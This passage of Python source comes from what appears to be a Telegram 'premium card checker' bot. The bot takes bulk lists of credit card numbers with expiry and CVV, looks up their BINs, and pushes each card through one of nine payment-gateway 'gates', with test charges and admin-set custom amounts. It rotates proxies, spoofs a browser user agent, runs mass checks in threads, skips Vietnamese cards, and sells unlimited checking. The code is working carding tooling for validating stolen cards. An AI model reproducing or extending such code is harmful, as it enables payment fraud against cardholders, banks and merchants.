            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
        except IndexError:
            logger.warning("Danh sách proxy tr?ng nhýng proxy ðang ðý?c b?t.")
            pass
    bin_info = {}
    try:
        bin_to_check = cc[:6]
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
        if error:
            return 'cancelled' if "cancelled" in error else 'error', line, f"L?i ki?m tra BIN: {error}", {}
        if bin_response:
            response_text_lower = bin_response.text.lower()
            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                return 'decline', line, 'INVALID_BIN_DECLINE', {}
            if bin_response.status_code == 200:
                try:
                    data = bin_response.json()
                    if isinstance(data, dict):
                        bin_info.update(data)
                    else:
                        logger.warning(f"API BIN tr? v? d? li?u không ph?i dictionary cho BIN {bin_to_check}: {data}")
                except json.JSONDecodeError:
                    logger.warning(f"L?i phân tích JSON t? BIN check cho BIN {bin_to_check}")
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
        active_gate = get_active_gate()
        gate_functions = {
            '1': _check_card_gate1, '2': _check_card_gate2, '3': _check_card_gate3,
            '4': _check_card_gate4, '5': _check_card_gate5, '6': _check_card_gate6,
            '7': _check_card_gate7, '8': _check_card_gate8, '9': _check_card_gate9,
        }
        gate_func = gate_functions.get(active_gate, _check_card_gate1)
        return gate_func(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount)
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong check_card cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng không xác ð?nh: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[??????????] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '?' * filled_len + '?' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- L?NH BOT ---
async def start(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id) or 'en'
    if user.id in load_users() or user.id == ADMIN_ID:
        if lang == 'vi':
            await update.message.reply_text(f"**Chào m?ng tr? l?i, {user.first_name}!**\nDùng /help ð? xem các l?nh b?n có th? s? d?ng.")
        else:
            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** ??\n\n"
            "This bot utilizes a powerful `Charge Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**?? Upgrade to Premium! ??**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "? **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "? **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"?? ID Telegram c?a b?n là: `{update.effective_user.id}`")

async def get_help_text(user: User, lang_code: str):
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)
    active_gate = get_active_gate()
    active_gate_name = get_formatted_gate_name(active_gate)
    gate_status_line_vi = f"\n?? **C?ng check th? hi?n t?i:** `{active_gate_name}`"
    gate_status_line_en = f"\n?? **Current Card Check Gate:** `{active_gate_name}`"
    new_commands_vi = (
        "\n**Ki?m tra Website:**\n"
        "?? `/site <website.com>`\n"
        "   - *Mô t?:* Ki?m tra thông tin m?t website (Gateway, Captcha, etc.).\n\n"
        "?? `/sitem`\n"
        "   - *Mô t?:* Ki?m tra nhi?u website cùng lúc (t?i ða 10).\n"
    )
    new_commands_en = (
        "\n**Website Checker:**\n"
        "?? `/site <website.com>`\n"
        "   - *Description:* Checks a single website's info (Gateway, Captcha, etc.).\n\n"
        "?? `/sitem`\n"
        "   - *Description:* Checks multiple websites at once (max 10).\n"
    )
    text_vi = {
        "public": (
            "**B?ng L?nh Công Khai** ???\n"
            "Chào m?ng b?n! Dý?i ðây là các l?nh cõ b?n b?n có th? s? d?ng:\n\n"
            "?? `/start`\n"
            "   - *Mô t?:* Kh?i ð?ng bot và nh?n ID Telegram c?a b?n.\n\n"
            "?? `/info`\n"
            "   - *Mô t?:* L?y l?i ID Telegram c?a b?n m?t cách nhanh chóng.\n\n"
            "?? `/help`\n"
            "   - *Mô t?:* Hi?n th? b?ng tr? giúp này.\n\n"
            f"**Nâng c?p Premium:**\nÐ? s? d?ng các tính nãng check không gi?i h?n, vui l?ng liên h? Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**B?ng L?nh Thành Viên** ??\n"
            "B?n ð? ðý?c c?p quy?n! S? d?ng các l?nh sau:\n\n"
            "**Ki?m tra Th?:**\n"
            "?? `/cs <th?>`\n"
            "   - *Mô t?:* Ki?m tra m?t th? tín d?ng duy nh?t.\n\n"
            "?? `/bin <bin>`\n"
            "   - *Mô t?:* L?y thông tin c?a m?t ð?u s? th? (BIN).\n\n"
            "?? `/multi`\n"
            f"   - *Mô t?:* Ki?m tra nhi?u th? trong m?t tin nh?n (t?i ða {user_multi_limit} th?).\n\n"
            "?? `/mass<s? lu?ng>`\n"
            "   - *Mô t?:* Ki?m tra hàng lo?t th? t? m?t t?p `.txt`.\n\n"
            "?? `/stop`\n"
            "   - *Mô t?:* D?ng tác v? `/mass` ho?c `/multi` ðang ch?y c?a b?n.\n"
            f"{new_commands_vi}\n"
            f"?? **H?n m?c /mass:** `{user_mass_limit}` lines/file.\n"
            f"?? **Nâng c?p Premium:** Liên h? {ADMIN_USERNAME} ð? check không gi?i h?n."
        )
    }
    text_en = {
        "public": (
            "**Public Command Menu** ???\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "?? `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "?? `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "?? `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** ??\n"
            "You are authorized! Use these commands:\n\n"
            "**Card Checker:**\n"
            "?? `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n\n"
            "?? `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n\n"
            "?? `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n\n"
            "?? `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
            "?? `/stop`\n"
            "   - *Description:* Stops your currently running /mass or /multi task.\n"
            f"{new_commands_en}\n"
            f"?? **/mass Limit:** `{user_mass_limit}` lines/file.\n"
            f"?? **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }
    admin_commands = (
        "**B?ng L?nh Qu?n Tr? Viên** ??\n"
        "Toàn quy?n qu?n l? bot v?i các l?nh sau:\n\n"
        "**Qu?n l? Bot & Check:**\n"
        "?? `/on`, `/off` - B?t/T?t bot.\n"
        "?? `/status` - Ki?m tra tr?ng thái các c?ng check.\n"
        "?? `/gate [1-9]` - Ð?i c?ng check.\n"
        "?? `/setgate <id> <min> <max>` - Ð?t kho?ng charge cho c?ng.\n"
        "?? `/stop <user_id>` - D?ng task c?a user.\n"
        "?? `/cs<amount> <card>` - Check v?i s? ti?n charge tùy ch?nh.\n\n"
        "**Qu?n l? Proxy:**\n"
        "?? `/onprx`, `/offprx` - B?t/T?t s? d?ng proxy.\n"
        "?? `/addprx <proxy>` - Thêm và ki?m tra proxy m?i.\n"
        "?? `/deleteprx` - Xem và xóa proxy hi?n có.\n"
        "?? `/testprx` - Ki?m tra các proxy ð? lýu.\n\n"
        "**Qu?n l? User & Tin nh?n:**\n"
        "?? `/add <user_id>`\n"
        "?? `/ban <user_id>`\n"
        "?? `/show` - Xem danh sách user.\n"
        "?? `/send <user_id> <tin_nh?n>`\n"
        "?? `/sendall <tin_nh?n>`\n\n"
        "**Qu?n l? Gi?i h?n:**\n"
        "?? `/addlimit <user_id> <s?>`\n"
        "?? `/addlimitmulti <user_id> <s?>`\n\n"
        "**Giám sát & L?ch s?:**\n"
        "?? `/active` - Xem các tác v? ðang ch?y.\n"
        "?? `/showcheck` - Xem th?ng kê check.\n"
        "?? `/lootfile <user_id>` - L?y l?i file k?t qu?."
    )
    lang_texts = text_vi if lang_code == 'vi' else text_en
    gate_status_line = gate_status_line_vi if lang_code == 'vi' else gate_status_line_en
    if user_id == ADMIN_ID:
        return f"{admin_commands}{gate_status_line_vi}\n\n{text_vi['member'].split('?? **H?n m?c /mass:**')[0].strip()}"
    elif user_id in load_users():
        return f"{lang_texts['member']}{gate_status_line}"
    else:
        return lang_texts['public']

async def help_command(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id)
    if not lang:
        keyboard = [
            [
                InlineKeyboardButton("???? Ti?ng Vi?t", callback_data="setlang_vi"),
                InlineKeyboardButton("???? English", callback_data="setlang_en"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui l?ng ch?n ngôn ng? c?a b?n / Please select your language:",
            reply_markup=reply_markup
        )
    else:
        help_text = await get_help_text(user, lang)
        await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"?? Ngý?i dùng `{user_to_add}` ð? có trong danh sách.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"? Ð? thêm ngý?i dùng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("? User ID không h?p l?.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"?? Ð? xóa ngý?i dùng `{user_to_ban}` và toàn b? log.")
        else:
            await update.message.reply_text(f"?? Không t?m th?y ngý?i dùng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("? User ID không h?p l?.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("?? Danh sách ngý?i dùng tr?ng."); return
    message_lines = ["?? **Danh sách ID & H?n m?c:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimit <user_id> <s?_d?ng_thêm>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("? D? li?u không h?p l?. H?y ch?c ch?n ID và s? lý?ng là s?."); return
    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    await update.message.reply_text(f"? **C?p nh?t gi?i h?n /mass thành công!**\n\n"
                                        f"?? **User ID:** `{target_user_id_str}`\n"
                                        f"?? **Gi?i h?n c?:** `{old_limit}`\n"
                                        f"? **Ð? thêm:** `{amount_to_add}`\n"
                                        f"?? **T?ng m?i:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimitmulti <user_id> <s?_th?_thêm>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("? D? li?u không h?p l?. H?y ch?c ch?n ID và s? lý?ng là s?."); return
    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    await update.message.reply_text(f"? **C?p nh?t gi?i h?n /multi thành công!**\n\n"
                                        f"?? **User ID:** `{target_user_id_str}`\n"
                                        f"?? **Gi?i h?n c?:** `{old_limit}`\n"
                                        f"? **Ð? thêm:** `{amount_to_add}`\n"
                                        f"?? **T?ng m?i:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B?n không ðý?c phép s? d?ng l?nh này. Vui l?ng liên h? Admin: {ADMIN_USERNAME}")
        return
    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Vui l?ng cung c?p m?t BIN h?p l? (6-8 ch? s?).\nS? d?ng: `/bin <bin_number>`")
        return
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"? Ðang ki?m tra BIN `{bin_to_check}`...")
    try:
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        session.headers.update({"User-Agent": ua})
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)
        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
            await msg.edit_text(f"? Không t?m th?y thông tin cho BIN `{bin_to_check}`."); return
        bin_info = bin_response.json()
        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None'
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)
        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " – ".join(bin_info_parts)
        response_text = (
            f"?? **BIN:** {bin_info_line}\n"
            f"??? **Bank:** {bank}\n"
            f"?? **Country:** {country_name} {flag}"
        )
        final_message = f"?? **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)
    except json.JSONDecodeError:
        await msg.edit_text(f"? L?i khi phân tích d? li?u t? API cho BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"L?i trong /bin: {e}", exc_info=True)
        await msg.edit_text(f"?? **L?i H? Th?ng:** `{e}`")

async def _process_single_check(update, context, line, custom_charge_amount=None):
    msg = await update.message.reply_text("? *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(
            check_card, line, custom_charge_amount=custom_charge_amount
        )
        duration = time.time() - start_time
        active_gate = get_active_gate()
        gate_name = get_formatted_gate_name(active_gate)
        if custom_charge_amount is not None:
            amount_in_usd = custom_charge_amount / 100.0
            gate_name = f"Custom Charge {amount_in_usd:.2f}$ (Gate {active_gate})"
        if status == 'gate_dead':
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                f"**?? Card:** `{original_line}`\n"
                                f"**?? Status: ? GATE DIED**\n"
                                f"**?? Response:** `The payment gateway is currently down (Forbidden). Please contact the admin.`\n\n"
                                f"**?? Gateway:** `{gate_name}`\n"
                                f"**?? Took:** `{duration:.2f}s`\n\n"
                                f"?? *Checker by: {ADMIN_USERNAME}*")
            await msg.edit_text(final_message)
            return
        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
        is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
        is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'
        if is_invalid_bin_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                f"**?? Card:** `{original_line}`\n"
                                f"**?? Status: ? DECLINED**\n"
                                f"**?? Response:** `Invalid Card Number (BIN not found)`\n\n"
                                f"**?? Gateway:** `BIN Check`\n\n"
                                f"**?? Took:** `{duration:.2f}s`\n\n"
                                f"?? *Checker by: {ADMIN_USERNAME}*")
        elif is_invalid_cardnumber_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                f"**?? Card:** `{original_line}`\n"
                                f"**?? Status: ? DECLINED**\n"
                                f"**?? Response:** `Invalid Card Number`\n\n"
                                f"**?? Gateway:** `Datatrans Tokenize`\n\n"
                                f"**?? Took:** `{duration:.2f}s`\n\n"
                                f"?? *Checker by: {ADMIN_USERNAME}*")
        elif is_expired_card_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                f"**?? Card:** `{original_line}`\n"
                                f"**?? Status: ? DECLINED**\n"
                                f"**?? Response:** `Card Expired`\n\n"
                                f"**?? Gateway:** `Pre-Check`\n\n"
                                f"**?? Took:** `{duration:.2f}s`\n\n"
                                f"?? *Checker by: {ADMIN_USERNAME}*")
        elif is_vn_decline:
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                f"**?? Card:** `{original_line}`\n"
                                f"**?? Status: ? DECLINED**\n"
                                f"**?? Response:** `DECLINED (Vietnam BIN)`\n\n"
                                f"**?? Gateway:** `{gate_name}`\n\n"
                                f"**?? Took:** `{duration:.2f}s`\n\n"
                                f"?? *Checker by: {ADMIN_USERNAME}*")
        else:
            status_text = ""
            response_message = ""
            status_map = {
                'custom': ("?? 3D SECURE", full_response), 'invalid_format': ("?? FORMAT ERROR", full_response),
                'error': ("?? ERROR", full_response), 'unknown': ("? UNKNOWN", full_response),
            }
            if status == 'live_success':
                status_text = "? Approved"
                response_message = "Card Added Successfully ??"
            elif status == 'decline':
                status_text = "? DECLINED"
                response_message = "Card Declined"
            elif status == 'success':
                try:
                    amount_charged_raw = int(full_response.split('_')[1])
                    amount_in_usd = amount_charged_raw / 100.0
                    status_text = f"? CHARGED {amount_in_usd:.2f}$"
                    response_message = f"Transaction successful for {amount_in_usd:.2f}$."
                except (ValueError, IndexError):
                    status_text = "? CHARGED"
                    response_message = "Transaction successful!"
            else:
                status_text, response_message = status_map.get(status, status_map['unknown'])
            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " – ".join(bin_info_parts)
            bin_details_str = (
                f"?? **BIN:** {bin_info_line}\n"
                f"??? **Bank:** {bank}\n"
                f"?? **Country:** {country_name} {flag}"
            )
            response_display_part = ""
            if status in ['custom', 'invalid_format', 'error', 'unknown']:
                safe_response = str(response_message)[:1000]
                response_display_part = f"**?? Response:**\n```json\n{safe_response}\n```"
            else:
                response_display_part = f"**?? Response:** `{response_message}`"
            final_message = (f"**?? CARD CHECK RESULT ??**\n\n"
                                f"**?? Card:** `{original_line}`\n"
                                f"**?? Status: {status_text}**\n"
                                f"{response_display_part}\n\n"
                                f"?? **BIN Info:**\n{bin_details_str}\n\n"
                                f"**?? Gateway:** `{gate_name}`\n\n"
                                f"**?? Took:** `{duration:.2f}s`\n\n"
                                f"?? *Checker by: {ADMIN_USERNAME}*")
        await msg.edit_text(final_message)
    except Exception as e:
        logger.error(f"L?i trong hàm _process_single_check: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"?? **System Error:**\n```\n{safe_error_message}\n```")

async def cs_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B?n không ðý?c phép s? d?ng l?nh này. Vui l?ng liên h? Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    if not context.args: await update.message.reply_text("S? d?ng: `/cs cc|mm|yy|cvv` ho?c `/cs cc|mm/yy|cvv`"); return
    line = " ".join(context.args)
    await _process_single_check(update, context, line)

async def cs_custom_amount_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID:
        return
    if not is_bot_on():
        await update.message.reply_text(MESSAGES_VI["bot_off"])
        return
    match = re.match(r'/cs(\d+)', update.message.text, re.IGNORECASE)
    if not match: return
    try:
        custom_charge_amount = int(match.group(1))
    except (ValueError, IndexError):
        await update.message.reply_text("? S? ti?n charge không h?p l?.")
        return
    card_info_str = update.message.text[len(match.group(0)):].strip()
    if not card_info_str:
        await update.message.reply_text(f"S? d?ng: `/cs{custom_charge_amount} cc|mm|yy|cvv`")
        return
    await _process_single_check(update, context, card_info_str, custom_charge_amount=custom_charge_amount)


async def multi_check_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B?n không ðý?c phép s? d?ng l?nh này. Vui l?ng liên h? Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    if user.id in ACTIVE_CHECKS:
        await update.message.reply_text("B?n ðang có m?t tác v? check khác ðang ch?y. Vui l?ng ch? nó hoàn thành ho?c dùng /stop.", quote=True)
        return
    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S? d?ng: `/multi` và dán danh sách th? c?a b?n ? d?ng dý?i."); return
    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await update.message.reply_text("Không có th? nào ð? check."); return
    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"?? **Vý?t quá gi?i h?n!**\n\n"
                f"B?n ð? g?i `{total_lines}` th?, nhýng gi?i h?n cho l?nh /multi là `{user_limit}` th? m?i l?n.\n\n"
                f"Ð? tãng h?n m?c, vui l?ng liên h? admin {ADMIN_USERNAME}."
            )
            return
    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    keyboard = [[InlineKeyboardButton("?? D?ng Task C?a Tôi", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    status_message = await update.message.reply_text(f"? Ðang kh?i t?o... Chu?n b? check `{total_lines}` th? qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    cancel_event = threading.Event()
    try:
        ACTIVE_CHECKS[user.id] = { "full_name": user.full_name, "username": user.username, "start_time": time.time(), "task_type": "multi" }
        CANCELLATION_EVENTS[user.id] = cancel_event
        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines)
        gate_died_flag = False
        gate_fail_card = ""
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        continue
                    counts[status] = counts.get(status, 0) + 1
                    status_icons = {'success': '?', 'live_success': '?', 'decline': '?', 'custom': '??', 'invalid_format': '??', 'error': '??', 'unknown': '?', 'cancelled': '??'}
                    result_line = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
                        elif full_response == 'INVALID_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
                        elif full_response == 'EXPIRED_CARD_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
                        else: result_line = f"{status_icons['decline']} `{original_line}`"
                    elif status == 'live_success':
                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        result_line = f"{status_icons['live_success']} `{original_line}` | Approved | `{bin_str}`"
                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | L? do: {str(full_response)[:50]}"
                    elif status == 'cancelled': continue
                    else:
                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        result_line = f"{status_icons.get(status, '?')} `{original_line}` | `{bin_str}`"
                    if result_line: results[status].append(result_line)
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"L?i khi x? l? future cho th? {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"?? `{original_line}` | L?i x? l?: {e}")
                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    status_lines = [
                        f"**?? Checking in progress...**\n{progress_bar}\n",
                        f"?? **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
                        status_lines.append(f"? **Charged:** `{counts['success']}`")
                    status_lines.extend([
                        f"? **Approved:** `{counts['live_success']}`",
                        f"? **Declined:** `{counts['decline']}`",
                        f"?? **3D Secure:** `{counts['custom']}` | ? **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)
                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"L?i khi c?p nh?t ti?n tr?nh /multi: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"L?i không xác ð?nh khi c?p nh?t ti?n tr?nh /multi: {e}")
                    last_update_time = time.time()
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)
        if gate_died_flag:
            await status_message.edit_text(
                f"?? **CHECK STOPPED - GATE DIED** ??\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return
        if cancel_event.is_set():
            await status_message.edit_text(f"?? **Tác v? ð? ðý?c d?ng theo yêu c?u.**\n\nÐ? x? l?: {processed_count}/{total_lines} th?.", reply_markup=None)
            return
        final_header = [
            f"**?? Check Complete!**\n", f"**Gate Used:** `{gate_name}`",
            f"**Total Cards:** `{total_lines}`", f"**Time Taken:** `{duration:.2f}s`\n",
        ]
        final_counts = []
        if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
            final_counts.append(f"? **Charged:** `{counts['success']}`")
        final_counts.extend([
            f"? **Approved:** `{counts['live_success']}`", f"? **Declined:** `{counts['decline']}`",
            f"?? **3D Secure:** `{counts['custom']}`", f"?? **Invalid Format:** `{counts['invalid_format']}`",
            f"?? **Errors:** `{counts['error']}`\n", f"-----------------------------------------"
        ])
        final_message = final_header + final_counts
        if results['live_success']: final_message.extend(("\n**? APPROVED:**", *results['live_success']))
        if results['success'] and (active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge')): final_message.extend(("\n**? CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**?? 3D SECURE CARDS:**", *results['custom']))
